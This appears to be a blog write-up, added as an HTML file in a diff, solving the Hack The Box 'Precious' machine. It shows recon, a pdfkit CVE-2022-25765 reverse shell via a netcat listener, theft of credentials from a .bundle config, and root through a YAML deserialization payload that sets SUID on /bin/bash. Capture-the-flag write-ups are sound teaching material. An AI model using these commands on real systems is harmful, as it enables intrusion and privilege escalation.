@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Home | EXO</title>
+        <link rel="icon" href="../../assets/img/favicon.png">
+        <link rel="stylesheet" type="text/css" href="../../assets/css/stylesheet.css" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </head> 
+    <body>
+        <div class="wrap">
+        <div class="banner">
+            <h1>ExoSphere</h1>
+            <p style="color:white;text-align:center;font-family: 'Chivo Mono', monospace;">Escape <span style="font-family: 'Dancing Script', cursive;">Insanity</span></p>
+        </div>
+        <div id="breaker-animated">
+            <div id="animated" class="animated"><img  src="../../assets/img/rocket.webp"style="width:50px;height:30px;">            </div>
+            <img style="opacity:0.2;width:auto;height:120;"src="../../assets/img/bg.jpg">
+        </div>
+        <div class="nav">
+                <ul>
+                <li><a href="../../index.html">Home</a></li>
+                <li class="active"><a href="../../writeups.html">WRITEUPS</a></li>
+                <li><a href="../../projects.html">Projects</a></li>
+                </ul>
+                <hr class="hr-nav1">
+
+        </div>
+
+        <div class="container">
+            <h1><span style="color:greenyellow;">HTB</span> | Precious Writeup |<span style="color:rgb(13, 187, 13)"> Easy</span></h1>
+            <hr class="separator">
+            <p style="font-size:21px;">So you're probably here because you're stuck at the Precious machine on HTB. <br>In this writeup I will try to detail as much as possible in order to help you out.<br><br> Let's begin!</p>
+            
+            <h1>First scan</h1>
+            <p style="font-size:21px">First, we're going to do a simple nmap scan to see what we're dealing with.<br> Using <span class="cody">nmap -A 10.10.11.189</span> we can see that there are only 2 ports open ! <br> <img src="img/precious/nmap.PNG"></p>
+            <p style="font-size:21px;">First you will need to add <span class="cody">precious.htb</span> to your hosts file.<br> So in order to do that you will need to type in your terminal <span class="cody">sudo nano /etc/hosts</span><br> and then add it as it is shown on the picture below.<br><br><img class="img_htb"src="img/precious/hosts.PNG"></p>
+            <h1>Diving in - [USER]</h1>
+            <p style="font-size:21px;">First thing I checked after scan is to see if Phusion Passanger or Nginx were vulnerable since they were outdated.<br>After some research I couldn't find anything interesting so I moved on.<br> When we access the html page (<span class="cody">http://precious.htb/</span>) we can see a simple website that converts html web pages to pdf.<br><br> 
+            <img src="img/precious/webpage.PNG"><br> typing in an url like google we get an error that says it cannot load remote URL's.<br>So instead, I wrote <span class="cody">http://127.0.0.1/\n</span> ** NOTE ** somehow this only works in chromium based browsers (only tried burp suite chromium one) firefox MIGHT not work.<br> After writting the local ip url, we get a pdf file.<br> We can then examine the pdf's metadata using the<span class="cody">pdfinfo</span> tool and we get this <br><img src="img/precious/wo.PNG"><br><br>
+        Investigating this pdfkit we see that it is has an CVE, it is CVE-2022-25765. <br> To facilitate things, I found a written python exploit on github so I won't go into details about the CVE.<br> Here is the <a target="new_blank" href="https://github.com/LordRNA/CVE-2022-25765">POC</a>. We first set a netcat listener on port 1234 using the command <span class="cody">nc -lvnp 1234</span> then we can run the exploit by typing this below: <br><span class="cody">python poc.py -u http://precious.htb/ -r [your tun0 IP] 1234</span> <br>And we got a shell!</p>
+        <p style="font-size:21px">We can see that we are the user ruby and we do not have the permission to read the user flag in henry's home directory<br> So after snooping a bit, I found out that the .bundle had henry's credentials in it.<br> So we navigate to our home by typing <span class="cody">cd ~</span> then we navigate to .bundle. In this .bundle directory, the config file contains credentials.<br> So we display those credentials using the <span class="cody">cat config</span> command.
+        <br><img src="img/precious/creds.PNG"><br><BR>So now we should be able to ssh into henry's machine. <br> We do that by typing <span class="cody">ssh henry@10.10.11.189</span> using the password we found.<br> We can the navigate to henry's home directory and read out the user flag!</p>
+        <h1>Challenging END | <span style="color:red">ROOT</span></h1>
+        <br><!-- dev/shm-->
+        <p style="font-size:21px;">It's now time to acquire root, so let's get started<br> First we're gonna see if henry is allowed to run any commands under root.<br> We check that by typing <span class="cody">sudo -l</span>.<br><br><img src="img/precious/sudo.PNG"><br><br> Looks like there is a script written in ruby that can be ran as root. Let's investigate further!<br>We can see that this program updates some dependencies located in the dependencies.yml file. <br> It uses YAML. So after doing some research, I found that YAML is vulnerable to deserialisation attacks so let's try one.<br>Let's navigate to <span class="cody">/dev/shm</span> and create a new file called dependencies.yml.<br> In this file you will want to paste this deserialization payload found on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">github</a>: <br>
+        <img src="img/precious/exp.PNG"><br>Then you will want to edit the <span class="cody">git_set : id</span> to <span class="cody">git_set : chmod u+s /bin/bash</span><br> That way, when running the program as root, it will elevate our bin/bash privilage to root (i think).<br><BR><img src="img/precious/exploit.PNG"><br>Save the file and run the command once again ( <span class="cody">sudo /usr/bin/ruby /opt/update_dependencies.rb</span> )<br> after running type <span class="cody">bash -p</span><br><br> Now if you type <span class="cody">whoami</span> you will see that we are root.<br><BR><img src="img/precious/rooted.PNG"><br> You can now read the flag and finish this machine.<br><br>Hope you learned something and I wish you a great day/night.<br> click <a style="text-decoration:none;color:rgb(163, 163, 255);font-size:21px;font-weight:bold;" href="../../index.html">here</a> to return home.</p>
+        </div>
+
+    </body>
+    <script src="../../assets/js/code.js">
+    </script>
+</html>
